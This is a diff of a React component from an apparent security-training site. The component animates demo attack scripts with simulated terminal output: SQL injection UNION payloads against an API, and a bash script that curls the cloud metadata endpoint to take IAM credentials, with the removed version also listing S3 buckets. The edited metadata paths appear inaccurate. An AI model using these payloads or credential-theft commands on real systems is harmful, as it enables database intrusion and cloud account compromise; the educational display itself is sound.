@@ -17,13 +17,12 @@ const AppReveal = () => {
     const [terminalLogs, setTerminalLogs] = useState([]);
     const terminalBodyRef = useRef(null);
 
-    // Gentle auto-scroll — nudge down by ~15% instead of jumping to absolute bottom
+    // Auto-scroll terminal to bottom so latest output is always visible
     useEffect(() => {
         if (terminalBodyRef.current) {
             const el = terminalBodyRef.current;
-            const scrollAmount = el.clientHeight * 0.15;
             const scrollTimeout = setTimeout(() => {
-                el.scrollBy({ top: scrollAmount, behavior: 'smooth' });
+                el.scrollTop = el.scrollHeight;
             }, 50);
             return () => clearTimeout(scrollTimeout);
         }
@@ -32,69 +31,47 @@ const AppReveal = () => {
     const attacks = [
         {
             url: "bugora.app/lessons/advanced-sql-discovery",
-            fileName: "exploit.go",
-            fileExt: "go",
-            keystrokes: "package main\n\nimport (\n  \"fmt\"\n  \"net/http\"\n  \"strings\"\n)\n\nfunc exploit(target string) {\n  payloads := []string{\n    \"' UNION SELECT NULL--\",\n    \"' OR 1=1--\",\n    \"' UNION SELECT user(),db()--\",\n  }\n  for _, p := range payloads {\n    resp, _ := http.Get(target + p)\n    if resp.StatusCode == 200 {\n      fmt.Println(\"[+] Injectable:\", p)\n    }\n  }\n}",
+            fileName: "exploit.py",
+            fileExt: "python",
+            keystrokes: "import requests\n\ntarget = \"http://api.target.com\"\npayload = \"' UNION SELECT user(),db()--\"\n\nr = requests.get(f\"{target}/users?id={payload}\")\nprint(r.json())",
             tokens: [
-                { text: "package", type: "keyword" },
-                { text: " main\n\n", type: "plain" },
                 { text: "import", type: "keyword" },
-                { text: " (\n  ", type: "plain" },
-                { text: "\"fmt\"", type: "string" },
-                { text: "\n  ", type: "plain" },
-                { text: "\"net/http\"", type: "string" },
-                { text: "\n  ", type: "plain" },
-                { text: "\"strings\"", type: "string" },
-                { text: "\n)\n\n", type: "plain" },
-                { text: "func", type: "keyword" },
-                { text: " ", type: "plain" },
-                { text: "exploit", type: "method" },
-                { text: "(target ", type: "plain" },
-                { text: "string", type: "keyword" },
-                { text: ") {\n  payloads := []", type: "plain" },
-                { text: "string", type: "keyword" },
-                { text: "{\n    ", type: "plain" },
-                { text: "\"' UNION SELECT NULL--\"", type: "string" },
-                { text: ",\n    ", type: "plain" },
-                { text: "\"' OR 1=1--\"", type: "string" },
-                { text: ",\n    ", type: "plain" },
+                { text: " requests\n\n", type: "plain" },
+                { text: "target", type: "variable" },
+                { text: " = ", type: "operator" },
+                { text: "\"http://api.target.com\"", type: "string" },
+                { text: "\n", type: "plain" },
+                { text: "payload", type: "variable" },
+                { text: " = ", type: "operator" },
                 { text: "\"' UNION SELECT user(),db()--\"", type: "string" },
-                { text: ",\n  }\n  ", type: "plain" },
-                { text: "for", type: "keyword" },
-                { text: " _, p := ", type: "plain" },
-                { text: "range", type: "keyword" },
-                { text: " payloads {\n    resp, _ := http.", type: "plain" },
-                { text: "Get", type: "method" },
-                { text: "(target + p)\n    ", type: "plain" },
-                { text: "if", type: "keyword" },
-                { text: " resp.StatusCode == 200 {\n      fmt.", type: "plain" },
-                { text: "Println", type: "method" },
+                { text: "\n\n", type: "plain" },
+                { text: "r", type: "variable" },
+                { text: " = requests.", type: "plain" },
+                { text: "get", type: "method" },
                 { text: "(", type: "plain" },
-                { text: "\"[+] Injectable:\"", type: "string" },
-                { text: ", p)\n    }\n  }\n}", type: "plain" }
+                { text: "f\"{target}/users?id={payload}\"", type: "string" },
+                { text: ")\n", type: "plain" },
+                { text: "print", type: "keyword" },
+                { text: "(r.json())", type: "plain" }
             ],
             terminal: [
-                { text: "[*] Compiling exploit.go...", type: "info", delay: 0.5 },
-                { text: "[+] Build successful. Binary: ./exploit", type: "success", delay: 1.5 },
-                { text: "[*] Scanning api.target.com for injection points...", type: "info", delay: 2.5 },
-                { text: "[*] Testing 3 payloads against /users?id= ...", type: "info", delay: 3.5 },
-                { text: "[!] HTTP 500 on payload 1: UNION SELECT NULL--", type: "info", delay: 5.0 },
-                { text: "[+] Injectable: ' UNION SELECT user(),db()--", type: "success", delay: 6.5 },
-                { text: "[+] Extracted: root@localhost | vault_prod", type: "success", delay: 8.0 },
-                { text: "[*] Dumping table schema...", type: "info", delay: 9.0 },
-                { text: "[+] 4 tables found: users, sessions, api_keys, admin_logs", type: "success", delay: 10.5 }
+                { text: "[*] Connecting to api.target.com...", type: "info", delay: 0.5 },
+                { text: "[+] Connection OK. Latency: 42ms", type: "success", delay: 1.5 },
+                { text: "[*] Injecting UNION payload on /users?id=", type: "info", delay: 3.0 },
+                { text: "[!] HTTP 500 — error on 'id' param", type: "info", delay: 4.5 },
+                { text: "[+] Injectable: UNION SELECT user(),db()--", type: "success", delay: 6.0 },
+                { text: "[+] Extracted: root@localhost | vault_prod", type: "success", delay: 7.5 },
+                { text: "[+] 4 tables: users, sessions, api_keys, logs", type: "success", delay: 9.0 }
             ],
             summary: "Union-based SQL Injection successful. Extracted database 'vault_prod' and confirmed 'root' access. Database schema exposed."
         },
         {
             url: "bugora.app/lessons/ssrf-iam-pillage",
-            fileName: "ssrf_chain.sh",
+            fileName: "ssrf.sh",
             fileExt: "sh",
-            keystrokes: "#!/bin/bash\n# SSRF → IAM Credential Exfiltration\n\nMETA=\"http://169.254.169.254\"\nROLE=$(curl -s $META/latest/meta-data/\\\n  iam/security-credentials/)\n\necho \"[*] Found role: $ROLE\"\nCREDS=$(curl -s $META/latest/\\\n  meta-data/iam/security-credentials/$ROLE)\n\nAK=$(echo $CREDS | jq -r '.AccessKeyId')\nSK=$(echo $CREDS | jq -r '.SecretAccessKey')\nTK=$(echo $CREDS | jq -r '.Token')\n\nexport AWS_ACCESS_KEY_ID=$AK\nexport AWS_SECRET_ACCESS_KEY=$SK\naws s3 ls --region us-east-1",
+            keystrokes: "#!/bin/bash\n\nMETA=\"http://169.254.169.254\"\nROLE=$(curl -s $META/latest/iam/)\n\nCREDS=$(curl -s $META/iam/$ROLE)\necho $CREDS | jq '.AccessKeyId'",
             tokens: [
                 { text: "#!/bin/bash", type: "comment" },
-                { text: "\n", type: "plain" },
-                { text: "# SSRF → IAM Credential Exfiltration", type: "comment" },
                 { text: "\n\n", type: "plain" },
                 { text: "META", type: "variable" },
                 { text: "=", type: "operator" },
@@ -104,50 +81,27 @@ const AppReveal = () => {
                 { text: "=", type: "operator" },
                 { text: "$(", type: "plain" },
                 { text: "curl", type: "method" },
-                { text: " -s $META/latest/meta-data/\\\n  iam/security-credentials/)\n\n", type: "plain" },
-                { text: "echo", type: "keyword" },
-                { text: " ", type: "plain" },
-                { text: "\"[*] Found role: $ROLE\"", type: "string" },
-                { text: "\n", type: "plain" },
+                { text: " -s $META/latest/iam/)\n\n", type: "plain" },
                 { text: "CREDS", type: "variable" },
                 { text: "=", type: "operator" },
                 { text: "$(", type: "plain" },
                 { text: "curl", type: "method" },
-                { text: " -s $META/latest/\\\n  meta-data/iam/security-credentials/$ROLE)\n\n", type: "plain" },
-                { text: "AK", type: "variable" },
-                { text: "=", type: "operator" },
-                { text: "$(echo $CREDS | ", type: "plain" },
+                { text: " -s $META/iam/$ROLE)\n", type: "plain" },
+                { text: "echo", type: "keyword" },
+                { text: " $CREDS | ", type: "plain" },
                 { text: "jq", type: "method" },
-                { text: " -r '.AccessKeyId')\n", type: "plain" },
-                { text: "SK", type: "variable" },
-                { text: "=", type: "operator" },
-                { text: "$(echo $CREDS | ", type: "plain" },
-                { text: "jq", type: "method" },
-                { text: " -r '.SecretAccessKey')\n", type: "plain" },
-                { text: "TK", type: "variable" },
-                { text: "=", type: "operator" },
-                { text: "$(echo $CREDS | ", type: "plain" },
-                { text: "jq", type: "method" },
-                { text: " -r '.Token')\n\n", type: "plain" },
-                { text: "export", type: "keyword" },
-                { text: " AWS_ACCESS_KEY_ID=$AK\n", type: "plain" },
-                { text: "export", type: "keyword" },
-                { text: " AWS_SECRET_ACCESS_KEY=$SK\n", type: "plain" },
-                { text: "aws", type: "method" },
-                { text: " s3 ls --region us-east-1", type: "plain" }
+                { text: " '.AccessKeyId'", type: "string" }
             ],
             terminal: [
-                { text: "[*] Routing through internal service proxy...", type: "info", delay: 0.8 },
-                { text: "[+] Proxy tunnel established at 10.0.42.12", type: "success", delay: 1.8 },
+                { text: "[*] Probing metadata endpoint...", type: "info", delay: 0.8 },
+                { text: "[+] Tunnel established at 10.0.42.12", type: "success", delay: 1.8 },
                 { text: "[*] Found role: web-app-production-role", type: "info", delay: 3.0 },
-                { text: "[*] Extracting IAM credentials...", type: "info", delay: 4.5 },
-                { text: "[!] CRITICAL: Credentials found for production-role!", type: "success", delay: 6.0 },
-                { text: "[+] AccessKeyId: ASIA... | SecretAccessKey: [REDACTED]", type: "success", delay: 7.5 },
-                { text: "[+] SessionToken: FwoGZXIvYXdz... (Valid: 3600s)", type: "success", delay: 9.0 },
-                { text: "[*] Listing S3 buckets with stolen credentials...", type: "info", delay: 10.0 },
-                { text: "[+] s3://prod-backups | s3://user-uploads | s3://config-vault", type: "success", delay: 11.5 }
+                { text: "[!] Credentials found for production-role!", type: "success", delay: 4.5 },
+                { text: "[+] AccessKeyId: ASIA... | Secret: [REDACTED]", type: "success", delay: 6.0 },
+                { text: "[+] Token: FwoGZXIvYXdz... (3600s)", type: "success", delay: 7.5 },
+                { text: "[+] s3://prod-backups | s3://config-vault", type: "success", delay: 9.0 }
             ],
-            summary: "SSRF exploit bypassed proxy layers to exfiltrate IAM role 'web-app-production-role' credentials. Session hijack completed."
+            summary: "SSRF exploit bypassed proxy to exfiltrate IAM credentials. Session hijack completed."
         }
     ];
 
@@ -198,7 +152,7 @@ const AppReveal = () => {
                             { text: "[+] available databases: vault_prod, information_schema", type: "success" },
                         ]
                     },
-                    { cmd: "go run exploit.go", dir: "~/labs", output: [] }
+                    { cmd: "python3 exploit.py", dir: "~/labs", output: [] }
                 ],
                 // Attack 1: SSRF — cloud recon + IAM workflow
                 [
@@ -218,7 +172,7 @@ const AppReveal = () => {
                             { text: "Host is up (0.0023s latency). 3 hosts discovered.", type: "success" },
                         ]
                     },
-                    { cmd: "bash ssrf_chain.sh", dir: "~/labs", output: [] }
+                    { cmd: "bash ssrf.sh", dir: "~/labs", output: [] }
                 ]
             ];
 
